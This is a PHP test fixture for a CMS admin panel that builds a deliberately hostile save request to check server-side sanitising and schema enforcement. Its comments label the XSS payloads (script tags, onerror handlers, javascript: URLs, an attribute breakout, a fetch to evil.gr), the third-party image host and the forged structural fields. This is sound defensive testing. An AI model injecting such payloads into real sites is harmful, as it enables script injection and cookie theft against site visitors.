<?php
/**
 * One admin save, with a hostile POST body.
 *
 * Was tests/_do_save.php, which had to be a separate process because
 * Admin::handle() echoed and exited. It is now a plain request body, shared by
 * 03_lockdown.php (which asserts what landed on disk) and 04_hardening.php
 * (which asserts what did not).
 *
 * The CSRF token and the baseline are the caller's to supply: this save is
 * legitimate in every way except its payload, which is the whole point — a
 * request rejected at the door proves nothing about the schema walk.
 */

declare(strict_types=1);

return static fn (string $csrf, string $baseline, string $heroSrc = ''): array => [
    'action'   => 'save',
    'csrf'     => $csrf,
    'page'     => 'home',
    'baseline' => $baseline,
    'title'    => '  Αρχική   σελίδα  <b>bold</b> ',

    'blocks' => [
        'hero' => [
            // legitimate edit
            'subheading' => 'Νέος υπότιτλος από τον πελάτη.',

            // 1. XSS attempt in a plain text field
            'heading'    => 'Καλημέρα <script>alert(1)</script><img src=x onerror=alert(2)>',

            // 2. hostile URL in a link field, in both halves of it — and a
            //    target that would break out of the attribute it is written to
            'cta_url'    => [
                'page'   => 'javascript:alert(document.cookie)',
                'url'    => 'javascript:alert(document.cookie)',
                'target' => '_blank" onclick=alert(1)',
            ],

            // 3. locked field — must be ignored even though it is posted
            'align'      => 'start',

            // 4. field that does not exist in schema.yml
            'evil'       => 'should never be written',

            // 5. attempt to retype the component
            'type'       => 'contact_cta',

            // 6. an image object: the src the page already has, but with the
            //    two values that are the server's to decide forged alongside
            //    it — the intrinsic dimensions, and whether it is decorative.
            //    The src is passed in rather than hardcoded because it is demo
            //    content: someone editing the site in the panel must not turn
            //    this into a failing test.
            'image'      => [
                'src'        => $heroSrc,
                'alt'        => 'Κείμενο που δεν πρέπει να αποθηκευτεί',
                'width'      => 99999,
                'height'     => 99999,
                'decorative' => false,
                'evil'       => 'undeclared sub-key',
            ],
        ],

        'intro' => [
            // 7. an image src pointed at a third-party host: accepting it turns
            //    the client's own /cdn-cgi/image endpoint into an open proxy.
            'image' => [
                'src' => 'https://evil.tld/x.jpg',
                'alt' => 'Δεν έχει σημασία',
            ],

            // 8. richtext: script/style/attribute/link laundering
            'body' => '<p onclick="steal()">Κείμενο <strong>έντονο</strong>'
                    . '<script>fetch("//evil.gr")</script>'
                    . '<style>body{display:none}</style>'
                    . '<a href="javascript:alert(1)">κακός</a> '
                    . '<a href="https://example.gr">καλός</a></p>'
                    . '<font face="Comic Sans">word paste</font><p>&nbsp;</p>',
        ],

        // 9. a repeater posted 200 rows deep, with attacker-chosen keys so the
        //    result would dump as a YAML *map* rather than a list, an
        //    undeclared sub-field in every row, and hostile HTML in the
        //    declared ones.
        'faq' => [
            'open_first' => 'definitely-not-a-boolean',
            'questions'  => array_combine(
                array_map(static fn (int $i): string => 'k' . $i, range(0, 199)),
                array_map(static fn (int $i): array => [
                    'question' => 'Ερώτηση ' . $i . '<script>alert(1)</script>',
                    'answer'   => '<p onclick="steal()">Απάντηση ' . $i . '</p>',
                    'evil'     => 'undeclared sub-field',
                ], range(0, 199))
            ),
        ],

        // 10. a block id that is not in the page file at all
        'injected_block' => [
            'heading' => 'I should not exist',
        ],
    ],

    // 10. structural fields that are not the client's to change
    'slug' => '/hacked',
    'id'   => 'hacked',
];
